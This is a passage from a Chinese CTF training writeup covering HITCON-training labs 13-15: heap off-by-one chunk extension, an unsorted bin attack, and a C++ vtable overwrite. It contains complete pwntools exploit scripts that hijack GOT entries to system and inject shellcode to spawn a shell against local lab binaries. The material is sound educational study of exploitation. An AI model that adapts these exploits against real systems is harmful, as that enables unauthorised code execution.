+<p>有溢出，但只溢出了1字节，要Extend the chunk就要改chunk的size，但一般来说1字节到不了size，前面还有prev_size。</p>
+<p>考虑64位，如果malloc的size没有16字节对齐，比如malloc（0x18），系统实际malloc了0x20字节给程序，<strong>不够的8字节由后面一个chunk的prev_size提供（共用）</strong>。这也很合理，当这个chunk在使用时，prev_size肯定为0，是没用的；当prev_size有用时，这个chunk已经被free了，里面的内容已经无用了。</p>
+<p>使用这个trick加一字节的溢出，我们刚好可以修改size。</p>
+<p>通过Extend the chunk是一块chunk被包入另一个chunk内，free这两个chunk，在重新malloc，就会实现同一块内存的重复使用，进而变成构造任意指针，从而任意地址读写。</p>
+<p>exp(改atoi到system):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">cn = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">bin = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(<span class="string">"1"</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(str(size))</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(<span class="string">"2"</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(<span class="string">"3"</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(<span class="string">"4"</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"0000"</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"1111"</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"a"</span>*<span class="number">0x18</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> +p64(<span class="number">0x30</span>) +  p64(bin.got[<span class="string">'atoi'</span>])) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">cn.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = cn.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"base:"</span>,hex(base)</span><br><span class="line">system = base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">cn.sendline(<span class="string">'$0'</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<p>exp(改free到system):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">r = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"dada"</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"ddaa"</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> +<span class="string">"a"</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> +p64(<span class="number">0x30</span>) +  p64(free_got)) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">base = free_addr - libc.symbols[<span class="string">'free'</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"base:"</span>,hex(base)</span><br><span class="line">system = base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab14"><a href="#lab14" class="headerlink" title="lab14"></a>lab14</h2><p>这题考察对unsorted bin attack的了解。</p>
+<p>unsorted bin attack是利用了free到unsorted bin list中的chunk在被malloc取出来的时候，没有使用unlink宏，而是自己实现的几行代码。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+<p>所以当我们控制了victim的bk时，那个地址加16(fd)的位置就会被改写成unsorted bin的地址，但是unsorted bin的bk也会被破坏，下一次再到这里时就可能因为victim-&gt;bk-&gt;fd不可写而造成SIGSEGV。而且这个任意内存写并不能控制写入什么，需要仔细寻找写入的位置。</p>
+<p>这个题应该说最难的地方就在这里，最后选择写入的地方是glibc中的global_max_fast全局变量，这个变量用于控制最大的Fast chunk的大小，将这里改写为unsorted bin的地址(一般来说是一个很大的正数)，就能使之后的chunk都被当作fast chunk，即可进行Fast bin attack。</p>
+<p>当然这题只是考察对unsorted bin attack的了解，没有后面那些步骤。</p>
+<p>把0x7f<em>**</em>的值写到magic中，程序判断成功后会cat flag。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = process(<span class="string">'./magicheap'</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_heap</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_heap</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x10</span>,<span class="string">'1111'</span>)<span class="comment">#0</span></span><br><span class="line">create_heap(<span class="number">0x80</span>,<span class="string">'2222'</span>)<span class="comment">#1</span></span><br><span class="line">create_heap(<span class="number">0x10</span>,<span class="string">'3333'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'1'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(magic<span class="number">-0x10</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>,<span class="number">0x30</span>,pay)</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x80</span>,<span class="string">"2222"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"4869"</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Congrt !\n'</span>)</span><br><span class="line">success(r.recvline())</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab15"><a href="#lab15" class="headerlink" title="lab15"></a>lab15</h2><p>c++的pwn，但还是简单的heap overflow，而且刻意的打开了execstack，就可以通过shellcode了。</p>
+<p>overflow在这里，由strcpy造成。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> &#123;</span></span><br><span class="line">	<span class="keyword">public</span> :</span><br><span class="line">		Animal()&#123;</span><br><span class="line">			<span class="built_in">memset</span>(name,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line">			weight = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;;&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;;&#125;</span><br><span class="line">	<span class="keyword">protected</span> :</span><br><span class="line">		<span class="keyword">char</span> name[<span class="number">24</span>];<span class="comment">//[BUG]heap overflow</span></span><br><span class="line">		<span class="keyword">int</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> :</span> <span class="keyword">public</span> Animal&#123;</span><br><span class="line">	<span class="keyword">public</span> :</span><br><span class="line">		Dog(<span class="built_in">string</span> str,<span class="keyword">int</span> w)&#123;</span><br><span class="line">			<span class="built_in">strcpy</span>(name,str.c_str());	<span class="comment">//[BUG]overflow</span></span><br><span class="line">			weight = w ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"Wow ~ Wow ~ Wow ~"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"| Animal info         |"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"  Weight :"</span> &lt;&lt; <span class="keyword">this</span>-&gt;weight &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"  Name : "</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"|---------------------|"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>在animal中，有一个虚表指针，用过覆盖覆盖指针到shellcode来getshell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./zoo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> cn.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> cn.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_dog</span><span class="params">(name,weight)</span>:</span></span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">'Name : '</span>)</span><br><span class="line">	sl(name)</span><br><span class="line">	ru(<span class="string">'Weight : '</span>)</span><br><span class="line">	sl(str(weight))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sl(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">'index'</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nameofzoo=<span class="number">0x0000000000605420</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'zoo'</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.linux.sh())</span><br><span class="line">len_sc = len(sc)</span><br><span class="line">sc += p64(nameofzoo)</span><br><span class="line"></span><br><span class="line">sl(sc)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'choice'</span>)</span><br><span class="line"></span><br><span class="line">add_dog(<span class="string">'aaaa'</span>,<span class="number">0x1111</span>)<span class="comment">#0</span></span><br><span class="line">add_dog(<span class="string">'bbbb'</span>,<span class="number">0x2222</span>)<span class="comment">#1</span></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">add_dog(<span class="string">'cccccccc'</span>*<span class="number">9</span> + p64(nameofzoo+len_sc),<span class="number">0x3333</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(cn)</span></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Veritas501</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://veritas501.github.io/2017/05/23/HITCON-training writeup/" title="HITCON-training writeup">https://veritas501.github.io/2017/05/23/HITCON-training writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+            <a href="/tags/HITCON-training/" rel="tag"># HITCON-training</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/08/arm syscall/" rel="next" title="arm syscall">
+                <i class="fa fa-chevron-left"></i> arm syscall
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/26/记录DDCTF中一道非常需要耐心的逆向题/" rel="prev" title="记录DDCTF中一道非常需要耐心的逆向题">
+                记录DDCTF中一道非常需要耐心的逆向题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/215.png"
+                alt="Veritas501" />
+            
+              <p class="site-author-name" itemprop="name">Veritas501</p>
+              <p class="site-description motion-element" itemprop="description">开始踏上Re&Pwn之路...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/veritas501" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://music.163.com/#/user/home?id=58295006" target="_blank" title="网易云"><i class="fa fa-fw fa-music"></i>网易云</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/xu-qt/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-quora"></i>知乎</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://osu.ppy.sh/users/9533614" target="_blank" title="OSU"><i class="fa fa-fw fa-headphones"></i>OSU</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Outline"><span class="nav-number">1.</span> <span class="nav-text">Outline</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab1"><span class="nav-number">2.</span> <span class="nav-text">lab1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#纯逆向"><span class="nav-number">2.1.</span> <span class="nav-text">纯逆向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用IDA的patch"><span class="nav-number">2.2.</span> <span class="nav-text">用IDA的patch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用gdb动态调试做"><span class="nav-number">2.3.</span> <span class="nav-text">用gdb动态调试做</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab2"><span class="nav-number">3.</span> <span class="nav-text">lab2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab3"><span class="nav-number">4.</span> <span class="nav-text">lab3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab4"><span class="nav-number">5.</span> <span class="nav-text">lab4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 